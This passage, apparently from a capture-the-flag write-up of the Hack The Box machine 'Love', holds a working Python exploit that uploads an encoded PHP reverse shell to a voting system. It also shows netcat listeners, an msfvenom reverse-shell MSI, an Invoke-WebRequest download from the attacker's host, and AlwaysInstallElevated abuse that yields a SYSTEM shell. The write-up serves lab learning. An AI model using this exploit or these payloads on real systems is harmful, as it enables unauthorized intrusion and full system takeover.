S0HQBE7X/EvkBjzZ+wSjQu+RNWj8bG9v++bjOK30O1H9XnqGJvAwD99pu5eW8t+631fGsjQ2PXh/J8vD1CeDxApspOU8LoMU4KJMZ581H0jRsdHPmWAfAUQhFPkqoUKvO4ABAuhmeeT1yRSClWqQBgg+T10QzFYPRo91vMlUoVab9FYUqxGP3m0FzJ6+TXiQBfokhF//zoHVuRlimG0dozN+f/O7/5vwA=";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);

?>
"""
payload = payload.replace("IIPP", REV_IP)
payload = payload.replace("PPOORRTT", REV_PORT)

s = requests.Session()

def getCookies():
    r = s.get(INDEX_PAGE)
    return r.cookies

def login():
    cookies = getCookies()
    data = {
        "username":USERNAME,
        "password":PASSWORD,
        "login":""
    }
    r = s.post(LOGIN_URL, data=data, cookies=cookies)
    if r.status_code == 200:
        print("Logged in")
        return True
    else:
        return False

def sendPayload():
    if login():
        global payload
        payload = bytes(payload, encoding="UTF-8")
        files  = {'photo':('shell.php',payload,
                    'image/png', {'Content-Disposition': 'form-data'}
                  )
              }
        data = {
            "firstname":"a",
            "lastname":"b",
            "password":"1",
            "add":""
        }
        r = s.post(VOTE_URL, data=data, files=files)
        if r.status_code == 200:
            print("Poc sent successfully")
        else:
            print("Error")

def callShell():
    r = s.get(CALL_SHELL, verify=False)
    if r.status_code == 200:
        print("Shell called check your listiner")
print("Start a NC listner on the port you choose above and run...")
sendPayload()
callShell()
{% endhighlight %}

<!-- {% comment %}

{% highlight python linenos %}
# --- Edit your settings here ----
IP = "192.168.1.207" # Website's URL
USERNAME = "potter" #Auth username
PASSWORD = "password" # Auth Password
REV_IP = "192.168.1.207" # Reverse shell IP
REV_PORT = "8888" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"
{% endhighlight %}
{% endcomment %}-->

At the top of the exploit, there are five parameters we need to configure. We configure them as shown below. Note that the `REV_IP` parameter should be set to the IP address of our host over the VPN connection as this is where the target host will connect to provide a reverse shell. Finally, we also need to remove `/votesystem` from the `INDEX_PAGE`, `LOGIN_URL`, `VOTE_URL` and `CALL_SHELL` parameters since the voting system is located at the root of the web server in our case. 
{% highlight python linenos %}
# --- Edit your settings here ----
IP = "love.htb" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.16.4" # Reverse shell IP
REV_PORT = "8888" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"
{% endhighlight %}

Next, we execute "nc -lvp 8888" to start a netcat listener on port 8888. Then, we run the exploit.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@python3 exploit.py@@
Start a NC listner on the port you choose above and run...
@@@Logged in@@@
@@@Poc sent successfully@@@
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ @@nc -lvp 8888@@                                                       
listening on [any] 8888 ...
@@@connect to [10.10.16.4] from love.htb [10.10.10.239] 62984@@@
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>@@whoami@@
whoami
@@@love\phoebe@@@

C:\xampp\htdocs\omrs\images>
{% endhighlight %}

After a couple of seconds, we receive a shell on the target as a user named "phoebe", as can be seen above.

# Privilege Escalation
To understand how to privesc the target, we must first familiarize ourselves with the Windows Registry. The Windows Registry is a hierarchical database which stores Windows-specific settings through the usage of keys and values. The Windows Registry is organized into a hierarchy of keys. Each key consist of one root key and any amount of subkeys. For example, the key `HKEY_LOCAL_MACHINE\Software\Microsoft` refers to the subkey `Microsoft` of the subkey `Software` of the `HKEY_LOCAL_MACHINE` root key. One way to interact with the registry is through the built-in Registry Editor program in Windows. We can start this program by pressing `CTRL+r`, typing "regedit" and pressing enter.

![registry](/assets/{{ imgDir }}/registry.png)

We can use the input field at the top of the GUI, to navigate to a certain key. For example, we can navigate to `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` as shown above. This location contains environment variables such as the `Path` variable. Another way to interact with the registry is to use the `reg` command in cmd, as demonstrated below. Note that the key is specified after `reg query` and that the value we want to extract from this key is specified using the `/v` flag.

{% highlight none linenos %}
C:\Users\Thomas>@@reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path@@

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
    @@@Path@@@    REG_SZ    @@@C:\Program Files\Microsoft\jdk-11.0.12.7-hotspot\bin;C:\Program Files (x86)\VMware\VMware Player\bin\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\NVIDIA Corporation\PhysX\Common;C:\Program Files\NVIDIA Corporation\NVIDIA NvDLISR;C:\Program Files\PuTTY\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files\dotnet\;C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\@@@
{% endhighlight %}

There are a large amount of different registry values that could be interesting when attempting to discover privilege escalation possiblities. One of these is `AlwaysInstallElevated` which can be found at `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` and `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`. If this value is set to `0x1` in both of these locations, the current user can install MSI files in the context of the `SYSTEM` account. This means that this user could compromise the `SYSTEM` account by installing a malicious MSI file. If we inspect the content of these two registry locations on the target host, we can see that `AlwaysInstallElevated` is enabled. 

{% highlight none linenos %}
C:\xampp\htdocs\omrs\images>@@reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated@@
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    @@@AlwaysInstallElevated@@@    REG_DWORD    @@@0x1@@@


C:\xampp\htdocs\omrs\images>@@reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated@@
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    @@@AlwaysInstallElevated@@@    REG_DWORD    @@@0x1@@@
{% endhighlight %}

We can generate a malicious MSI file with msfvenom as shown below. The `windows/shell_reverse_tcp` payload is an <i>unstaged</i> reverse shell payload, meaning that we can catch it with a netcat listener. The `lhost` and `lport` parameters specify an IP address and a port number which the reverse shell payload should connect back to. Furthermore, we use the `-f` flag to specify that we want the payload in the format of an MSI file. We save the resulting MSI file in a file named "rs.msi".

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.4 lport=8889 -f msi > rs.msi@@
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
@@@Final size of msi file: 159744 bytes@@@
{% endhighlight %}

The next step is to download this payload to the target and execute it. We start by initializating a Python web server by executing `python3 -m http.server 80`. Then, in our reverse shell, we start Powershell by executing `powershell`. We then run the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) cmdlet with the `-Uri` and `-OutFile` flags to download our malicious MSI file. We use the `-Uri` flag to specify the URL of the malicious MSI file on our web server and the `-OutFile` flag to specify where the file should be written. Note that we write the file to the `C:\Windows\temp` directory since this is normally a location where all windows accounts have `Write` permissions.

{% highlight none linenos %}
C:\xampp\htdocs\omrs\images>@@powershell@@
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

@@@PS@@@ C:\xampp\htdocs\omrs\images> @@Invoke-WebRequest -Uri "http://10.10.16.4/rs.msi" -OutFile "C:\Windows\temp\rs.msi"@@
Invoke-WebRequest -Uri "http://10.10.16.4/rs.msi" -OutFile "C:\Windows\temp\rs.msi"
{% endhighlight %}

Shortly after executing the command, the Python web server logs indicate that the file was downloaded by the target.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo python3 -m http.server 80@@                                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@@10.10.10.239 - - [18/Apr/2022 11:03:17] "GET /rs.msi HTTP/1.1" 200 -@@@
{% endhighlight %}

Next, we execute "nc -lvp 8889" to start a netcat listener on port 8889. Then, we use [msiexec](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec) to install our malicious MSI file. We use the `/i` flag to specify that we want to install an MSI file.
{% highlight none linenos %}
PS C:\xampp\htdocs\omrs\images> @@msiexec /i C:\Windows\Temp\rs.msi@@
msiexec /i C:\Windows\Temp\rs.msi
PS C:\xampp\htdocs\omrs\images>
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@nc -lvp 8889@@                                                 
listening on [any] 8889 ...
connect to [10.10.16.4] from love.htb [10.10.10.239] 62999
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>@@whoami@@
whoami
@@@nt authority\system@@@

C:\WINDOWS\system32>
{% endhighlight %}

A couple of milliseconds after executing the malicious MSI file, our netcat listener receives a connection and we obtain a shell as the `SYSTEM` account on the target host!

